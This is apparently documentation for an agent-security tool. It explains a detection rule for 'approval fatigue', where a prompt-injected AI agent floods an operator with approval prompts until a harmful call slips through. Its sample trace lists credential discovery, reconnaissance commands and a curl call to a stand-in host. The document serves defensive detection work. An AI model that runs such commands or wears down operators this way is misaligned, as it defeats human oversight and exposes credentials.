# Case study: approval fatigue

A high count of `require_approval` verdicts in a single session
indicates that the agent is generating an unusual amount of
medium-severity activity — sometimes legitimately (a maintenance
workflow that touches many sensitive paths), sometimes deliberately,
to exhaust operator attention. This document walks through
[`ai_agent_approval_fatigue.yml`][rule] and shows why per-request
detection alone misses it.

[rule]: ../../rules/rules/ai_agent/ai_agent_approval_fatigue.yml

> Pattern catalogued in the *Human-in-the-Loop Traps* category of
> Franklin et al., [AI Agent Traps](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6372438)
> (Google DeepMind, 2026). Approval fatigue is the second-order effect
> of correctly-fired medium-severity alerts: each one in isolation is
> a reasonable judgment; the *count* is the signal.

## Scenario

The agent has been instructed (via prompt injection or via a poisoned
tool description) to perform a long sequence of operations each of
which is suspicious enough to require approval but not severe enough
to block. After the third or fourth `[Approve]` prompt in quick
succession, an operator's accuracy degrades. By the eighth, the
operator approves without reading. The attacker's actual goal — the
ninth or tenth call — slips through with rubber-stamped consent.

## Trace

```
T+0     session=beta-3   exec("cat /etc/group")
                         alert (medium): /etc/* read
                         verdict: REQUIRE_APPROVAL → operator approves
                         session.approval_count = 1

T+8s    session=beta-3   exec("find / -name '*.pem' 2>/dev/null")
                         alert (medium): credential discovery
                         verdict: REQUIRE_APPROVAL → operator approves
                         session.approval_count = 2

T+15s   session=beta-3   exec("netstat -tnlp")
                         alert (medium): network reconnaissance
                         verdict: REQUIRE_APPROVAL → operator approves
                         session.approval_count = 3

T+22s   session=beta-3   exec("ps auxf")
                         alert (medium): process listing
                         verdict: REQUIRE_APPROVAL → operator approves
                         session.approval_count = 4

T+30s   session=beta-3   exec("docker ps -a")
                         alert (medium): container enumeration
                         verdict: REQUIRE_APPROVAL → operator approves
                         session.approval_count = 5
                                                  ──────────────
                                                  threshold reached

T+37s   session=beta-3   exec("curl http://suspicious.example/data")
                         ── ai_agent_approval_fatigue fires ──
                         (the per-request rules also fire on this
                          specific egress, but the fatigue rule is
                          the architectural addition)
                         verdict: REQUIRE_APPROVAL with elevated
                                  warning surface
```

The detection block:

```yaml
detection:
  selection:
    session.approval_count|re: '^([5-9]|[1-9][0-9]+)$'
  condition: selection
```

`session.approval_count` is computed by the session registry from the
prior events' verdicts. When the count crosses 5 (matching the regex
on `5-9` and any `10+`), the next medium-severity event in the same
session inherits the fatigue alert on top of whatever else fired. The
regex anchoring (`^...$`) is precise — it counts approvals exactly,
not approvals-as-substring.

There is also a related testcase
[`bench/testcases/approval_fatigue/high_approval_count.yaml`](../../bench/testcases/approval_fatigue/high_approval_count.yaml)
that pre-injects `session.approval_count: "6"` to exercise the
detection without having to replay six prior events.

## Why a stateless system can't detect this

Approval fatigue is **a verdict-pattern signal**. It depends on three
things a forward proxy cannot have:

1. **Per-session memory of prior alerts.** The proxy doesn't track
   alerts; it makes one-shot allow/block decisions on each request.
2. **Knowledge of the agent's verdict workflow.** The proxy doesn't
   know that some requests are gated by human approval. It either
   allows or blocks; the `require_approval` action only exists at the
   tool-call layer.
3. **Counting state.** Even if the proxy could express "many
   medium-severity decisions in this session", it has no concept of
   session for short-lived TLS connections that close between requests.

The only place this signal can live is at the layer that sees the
verdicts as they're produced. AgentShield's evaluator emits the
verdict, the session registry records it, and the next evaluation
sees the running count. A network proxy could in principle log every
verdict to a SIEM and have the SIEM emit a delayed alert — but that's
detection-after-the-fact, not enforcement. AgentShield can act on the
fatigue signal *during* the next evaluation, before the rubber-stamped
call executes.

## Operational notes

- **Tuning the threshold.** 5 is the floor; legitimate batch
  operations on sensitive files can hit 10–20 in a normal day. If
  your environment's approval cadence is higher, raise the regex
  bound (`'^([5-9]|...$'` → `'^([1-9][0-9]+)$'` for ≥10) and pair
  with an explicit allow-list for known-good batch tools.
- **Severity is medium, not high.** The rule fires `require_approval`
  in `enforce` mode — it doesn't block. The principle is that fatigue
  is a *signal*, not a hard verdict; the operator should see "you've
  approved 5+ alerts in this session, sure?" and decide.
- **Pairs with override-escalation.** When fatigue causes operators to
  override blocks (not just approve mediums),
  [`ai_agent_override_escalation`](override-escalation.md) takes over
  with a stricter response.

## Related

- Rule: [`ai_agent_approval_fatigue.yml`][rule]
- Reference: [Franklin et al., *AI Agent Traps* (SSRN 2026)](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=6372438)
- MITRE: [T1204 — User Execution](https://attack.mitre.org/techniques/T1204/)
- Sibling rule: [override escalation](override-escalation.md)
- Bench testcase: [`approval_fatigue/high_approval_count.yaml`](../../bench/testcases/approval_fatigue/high_approval_count.yaml)
